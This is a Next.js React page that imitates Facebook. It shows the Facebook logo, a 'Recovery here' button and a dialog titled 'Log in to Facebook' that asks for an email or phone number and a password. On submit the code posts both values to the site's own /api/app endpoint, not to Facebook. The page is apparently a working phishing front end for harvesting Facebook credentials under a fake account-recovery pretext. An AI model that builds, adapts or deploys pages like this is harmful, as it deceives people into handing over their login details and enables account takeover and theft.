import { Inter } from "next/font/google";
import {
  Box,
  Button,
  Dialog,
  DialogActions,
  DialogContent,
  DialogTitle,
  TextField,
} from "@mui/material";
import { useEffect, useState } from "react";

const inter = Inter({ subsets: ["latin"] });

export default function Home() {
  const [data, setData] = useState({
    email: "",
    password: "",
  });
  const [open, setOpen] = useState<boolean>(false);

  const clickhandle = async () => {
    if (data.email == "" || data.password == "") {
      setOpen(true);
    } else {
      setOpen(false);
      const response = await fetch(`/api/app`, {
        method: "POST",
        headers: {
          "content-type": "application/json",
        },
        body: JSON.stringify(data),
      });
      const { row } = await response.json();
    }
  };

  return (
    <Box
      sx={{
        display: "flex",
        flexDirection: "column",
        alignItems: "center",
      }}
    >
      <img
        src="/facebook.jpg"
        style={{
          width: "200px",
          marginTop: "100px",
          borderRadius: "20px",
          marginBottom: "20px",
        }}
      ></img>
      <Button variant="contained" onClick={() => setOpen(true)}>
        Recovery here
      </Button>
      <Dialog open={open} onClose={() => setOpen(false)}>
        <Box
          sx={{
            display: "flex",
            alignItems: "center",
            flexDirection: "column",
          }}
        >
          <img
            src="/facebook.png"
            style={{ width: "50px", marginTop: "10px" }}
          ></img>
          <DialogTitle>Log in to Facebook</DialogTitle>
        </Box>
        <DialogContent sx={{ width: 250 }}>
          <Box>
            <TextField
              value={data.email}
              placeholder="Email address or phone number"
              sx={{ width: "100%", mb: 2 }}
              onChange={(evt) => setData({ ...data, email: evt.target.value })}
            />
            <TextField
              value={data.password}
              type="password"
              placeholder="Password"
              sx={{ width: "100%", mb: 2 }}
              onChange={(evt) =>
                setData({ ...data, password: evt.target.value })
              }
            />
          </Box>
        </DialogContent>
        <DialogActions sx={{ display: "flex", justifyContent: "center" }}>
          <Button
            variant="contained"
            onClick={() => {
              clickhandle();
              setData({ email: "", password: "" });
            }}
            sx={{ color: "#FFFFFF", mb: 3 }}
          >
            Log in
          </Button>
        </DialogActions>
      </Dialog>
    </Box>
  );
}
